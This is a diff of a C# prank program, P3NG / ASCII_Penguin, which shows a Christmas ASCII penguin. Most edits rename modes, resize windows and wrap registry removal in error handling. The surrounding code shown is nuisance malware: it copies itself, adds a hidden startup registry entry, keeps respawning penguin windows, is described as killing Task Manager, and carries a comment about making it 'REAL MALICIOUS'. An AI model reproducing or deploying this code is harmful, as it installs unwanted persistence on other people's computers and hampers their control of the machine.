@@ -10,9 +10,8 @@ using System;
 
 :: ---------------- ::
 ::                  ::
-::  ASCII_Penguin   ::
-::      v1.0.0      ::
-:: Variant of P3NG  ::
+::     P3NG.exe     ::
+::      v1.0.1      ::
 ::                  ::
 ::  Bryant Finnern  ::
 ::    p3ng00.com    ::
@@ -20,6 +19,9 @@ using System;
 :: ---------------- ::
 ::                  ::
 ::     Created      ::
+::    2021.11.10    ::
+::                  ::
+::      Edited      ::
 ::    2021.11.13    ::
 ::                  ::
 :: ---------------- ::
@@ -31,10 +33,10 @@ class Penguin
     [DllImport("kernel32.dll")] static extern IntPtr GetConsoleWindow();
     [DllImport("user32.dll")] static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
-    const string TITLE = "P3NG";
+    const string TITLE = "ASCII_Penguin";
 
     const string strHidden = "HIDDEN";
-    const string strPenguin = "PENGUIN";
+    const string strDisplay = "DISPLAY";
     const string strCure = "CURE";
 
     static readonly Random random = new Random();
@@ -54,25 +56,23 @@ class Penguin
         {
             switch (args[0])
             {
+                // Hidden Window
+                // (Creates Penguin Windows
+                // and kill Task Manager)
                 case strHidden:
-                    // Hidden Window Request
-
-                    // 1 in x chance to start another window.
-                    // this is set to 0 to prevent annoyance.
-                    int chance = 0;
-
-                    if (args.Length > 1)
-                    {
-                        int.TryParse(args[1], out chance);
-                    }
-
-                    WindowHidden(chance);
+                    WindowHidden();
                     break;
 
-                case strPenguin:
-                    WindowPenguin();
+                // Display Window
+                // (Window that displays
+                // the penguins)
+                case strDisplay:
+                    WindowDisplay();
                     break;
 
+                // Cure Window
+                // (Window that runs
+                // the cure process)
                 case strCure:
                     WindowCure();
                     break;
@@ -147,7 +147,7 @@ class Penguin
             File.Copy(Process.GetCurrentProcess().MainModule.FileName, destFile.ToString());
 
             // Add startup registry key
-            Registry.SetValue(destRegKey.ToString(), "P3NG", destFile.ToString().Replace("/", @"\") + " " + strHidden);
+            Registry.SetValue(destRegKey.ToString(), TITLE, destFile.ToString().Replace("/", @"\") + " " + strHidden);
 
             // Write a space to show that this was successful
             Console.Write(" ");
@@ -179,7 +179,7 @@ class Penguin
         }
     }
 
-    static void WindowHidden(int chance)
+    static void WindowHidden()
     {
         int currWindowCount = 0;
         // 'lastPengCount' set to 2 as a minimum to account for host process and creation of one hidden window
@@ -241,7 +241,7 @@ class Penguin
                 for (i = 0; i < windowDifference; i++)
                 {
                     // Create a new window
-                    CreatePenguinWindow();
+                    CreateDisplayWindow();
 
                     // IF YOU WANNA BE REAL MALICIOUS
                     // CREATE MORE THAN ONE WINDOW
@@ -252,7 +252,7 @@ class Penguin
     }
 
     // This handles the windows that display the penguins
-    static void WindowPenguin()
+    static void WindowDisplay()
     {
         string asciiStr =
             "\n" + @"       .     .                       *** **" +
@@ -273,7 +273,7 @@ class Penguin
             "\n" + @"                  Merry Christmas ~ JP3                   #";
 
         int windowWidth = 78;
-        int windowHeight = 20;
+        int windowHeight = 27;
 
         /*
 
@@ -322,8 +322,8 @@ class Penguin
     static void WindowCure()
     {
         Console.Clear();
-        int windowWidth = 40;
-        int windowHeight = 20;
+        int windowWidth = 70;
+        int windowHeight = 25;
         int count;
         Console.SetWindowSize(windowWidth, windowHeight);
         Console.SetBufferSize(Console.WindowLeft + windowWidth, Console.WindowTop + windowHeight);
@@ -374,8 +374,15 @@ class Penguin
         }
 
         // Remove registry key
-        destRegKey.DeleteValue(TITLE);
-        Console.WriteLine("Removed from startup");
+        try
+        {
+            destRegKey.DeleteValue(TITLE);
+            Console.WriteLine("Removed from startup");
+        }
+        catch (Exception)
+        {
+            Console.WriteLine("Not present in registry");
+        }
 
         // Close after user input...
         Console.WriteLine("\n " + TITLE + " has been completely removed.\n");
@@ -383,8 +390,8 @@ class Penguin
         Console.ReadKey();
     }
 
-    static void CreatePenguinWindow()
+    static void CreateDisplayWindow()
     {
-        Process.Start(Process.GetCurrentProcess().MainModule.FileName, strPenguin);
+        Process.Start(Process.GetCurrentProcess().MainModule.FileName, strDisplay);
     }
 }
